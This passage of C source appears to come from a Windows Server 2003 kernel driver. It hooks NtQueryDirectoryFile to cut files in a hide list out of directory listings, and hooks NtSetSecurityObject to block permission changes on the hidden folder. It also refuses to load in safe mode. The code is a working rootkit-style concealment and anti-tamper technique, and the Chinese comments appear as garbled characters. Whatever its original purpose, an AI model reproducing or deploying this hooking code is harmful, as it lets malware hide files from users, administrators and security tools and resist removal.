    dbg_msg("test file %S ",fileName);
    if(_wcsicmp(fileName,g_HideDir) == 0)
    {
        return TRUE;
    }
    return FALSE;
}
/////////////////////////////////////////////////////////////
/*
�����ļ� �������ļ���ʵ��
*/
NTSTATUS HOOK_NtQueryDirectoryFile(IN HANDLE FileHandle,
                                   IN HANDLE EventHandle OPTIONAL,
                                   IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
                                   IN PVOID ApcContext OPTIONAL,
                                   OUT PIO_STATUS_BLOCK IoStatusBlock,
                                   OUT PVOID FileInformation,
                                   IN ULONG Length,
                                   IN FILE_INFORMATION_CLASS FileInformationClass,
                                   IN BOOLEAN ReturnSingleEntry,
                                   IN PUNICODE_STRING FileName OPTIONAL,
                                   IN BOOLEAN RestartScan)
{
    if(av_CheckHookState())
    {
        NTSTATUS status ; 
        status = ((P_NtQueryDirectoryFile)g_hook_table[I_NtQueryDirectoryFile].Real_func)(FileHandle,
            EventHandle ,
            ApcRoutine ,
            ApcContext ,
            IoStatusBlock,
            FileInformation,
            Length,
            FileInformationClass,
            ReturnSingleEntry,
            FileName ,
            RestartScan);
        if(STATUS_SUCCESS == status)
        {
			if (FileBothDirectoryInformation == FileInformationClass)
			{
				FILE_BOTH_DIR_INFORMATION* pPrev = NULL;
				FILE_BOTH_DIR_INFORMATION* pFileInfo = 
					(FILE_BOTH_DIR_INFORMATION*)FileInformation;
				BOOL bLastFlag=FALSE;
				WCHAR *DirName = av_GetFileDosPathFromHandle(FileHandle);
				if(DirName)
				{
                    //�ȹ������ļ���  ���н��ļ��м��뵽�����б��� ֱ�������ļ����������ļ�
                    WCHAR wFullName[MAX_PATH];
                    av_wcsncpy(wFullName,DirName,MAX_PATH);
                    av_wcsncat(wFullName,L"\\",MAX_PATH);
                    clean_backslash(wFullName);
                    if (av_IsFileNameInHideList(wFullName))
                    {
                        RtlZeroMemory(FileInformation,Length);
                        status = STATUS_ACCESS_DENIED;
                    }
                    else
                    {
                        __try
                        {
                            do
                            {
                                WCHAR wFileName[MAX_PATH] ;
                                WCHAR FullFileName[MAX_PATH];  //�Ͳ������ڴ��� 
                                bLastFlag = !(pFileInfo->NextEntryOffset);
                                wcsncpy(FullFileName,DirName,MAX_PATH);
                                av_wcsncat(FullFileName,L"\\",MAX_PATH);  //����Ǹ�·�����Զ����� \ ���򲻻�
                                RtlZeroMemory(wFileName,sizeof(wFileName));
                                RtlCopyMemory(wFileName,pFileInfo->FileName,pFileInfo->FileNameLength);
                                av_wcsncat(FullFileName,wFileName,MAX_PATH);
                                clean_backslash(FullFileName);
                                if (av_IsFileNameInHideList(FullFileName)) //
                                {
                                    if (bLastFlag) //���������һ���ļ�
                                    {
                                        if(pPrev)
                                            pPrev->NextEntryOffset = 0;
                                        else
                                        {
                                            //ֻ��һ���ļ�  findFirstFile ��ʱ���ܷ���ʧ��
                                            /*
                                            , if the output buffer contains no structures, 
                                            ZwQueryDirectoryFile returns STATUS_SUCCESS but 
                                            sets IoStatusBlock->Information = 0 to notify the 
                                            caller of this condition. In this case, the 
                                            caller should allocate a larger buffer and call 
                                            ZwQueryDirectoryFile again.

                                            �������ú� �ϲ���Ϊ������̫С��  �����û����� �ٴε��õ�ʱ��
                                            ʵ���������˵�һ���ļ�
                                            */
                                            IoStatusBlock->Information = 0;
                                        }
                                        break;
                                    }
                                    else
                                    {
                                        if(pPrev)
                                        {
                                            pPrev->NextEntryOffset += pFileInfo->NextEntryOffset;
                                            pFileInfo = 
                                                (FILE_BOTH_DIR_INFORMATION *)((CHAR*)pFileInfo+pFileInfo->NextEntryOffset);
                                        }
                                        else
                                        {
                                            //��һ���ļ����ǰ� ..
                                            //int iPos = (ULONG)pFileInfo - (ULONG)FileInformation;
                                            //int iLeft = (ULONG)Length - iPos - pFileInfo->NextEntryOffset;
                                            RtlCopyMemory( (PVOID)pFileInfo, 
                                                (PVOID)( (char *)pFileInfo + pFileInfo->NextEntryOffset ), 
                                                Length - pFileInfo->NextEntryOffset );
                                        }
                                        continue;
                                    }
                                }
                                pPrev = pFileInfo;
                                pFileInfo=
                                    (FILE_BOTH_DIR_INFORMATION *)((CHAR*)pFileInfo+pFileInfo->NextEntryOffset);
                            }while(!bLastFlag);
                        }
                        __except(EXCEPTION_EXECUTE_HANDLER)
                        {
                            dbg_msg("get a exception \n");
                        }
                    }
				}
				if(DirName)
					av_Free(DirName);
			}
        }
        return status;
    }
    //else
    return ((P_NtQueryDirectoryFile)g_hook_table[I_NtQueryDirectoryFile].Real_func)(FileHandle,
        EventHandle ,
        ApcRoutine ,
        ApcContext ,
        IoStatusBlock,
        FileInformation,
        Length,
        FileInformationClass,
        ReturnSingleEntry,
        FileName ,
        RestartScan);
}


NTSTATUS  HOOK_NtSetSecurityObject(IN HANDLE Handle,
                    IN SECURITY_INFORMATION SecurityInformation,
                    IN PSECURITY_DESCRIPTOR SecurityDescriptor)
{
	if(av_CheckHookState())
	{
		HANDLE hFile = Handle;
		WCHAR *FileName = av_GetFileDosPathFromHandle(hFile);
		if(FileName)
		{
			// TODO  �Ը��ļ��� Ҳ��������
			dbg_msg("try set file %S sec info ",FileName);
			if(wcsstr(FileName,g_HideDir))
			{
				//�ҵ��ˡ����� �ܾ����ø��ļ���Ȩ�ޡ���
				av_Free(FileName);
				return STATUS_ACCESS_DENIED;
			}
			av_Free(FileName);
		}
	}
	return ((P_NtSetSecurityObject)g_hook_table[I_NtSetSecurityObject].Real_func)(Handle,
		SecurityInformation,
		SecurityDescriptor);
}

/////////////////////////////////////////////////////////////
NTSTATUS DriverEntry(
    __in PDRIVER_OBJECT DriverObject,
    __in PUNICODE_STRING RegistryPath
    )
{
    RTL_OSVERSIONINFOW  vi = {sizeof(RTL_OSVERSIONINFOW)};
    UNREFERENCED_PARAMETER(DriverObject);
	UNREFERENCED_PARAMETER(RegistryPath);

    if(STATUS_SUCCESS != RtlGetVersion(&vi))
    {
        dbg_msg("get os ver error ~!");
        return STATUS_UNSUCCESSFUL;
    }
    if (3790 != vi.dwBuildNumber)
    {
        dbg_msg("os is not win2003 ~!");
        return STATUS_UNSUCCESSFUL;
    }

	if(IsSafeBootMode())
	{
		dbg_msg("i reject be loaded in safe mode ");
		return STATUS_UNSUCCESSFUL;
	}

    if(!av_InitGloabl())
    {
        dbg_msg("init global data error ~!");
        return STATUS_UNSUCCESSFUL;
    }

    av_InitHookTable();

	return STATUS_SUCCESS;
}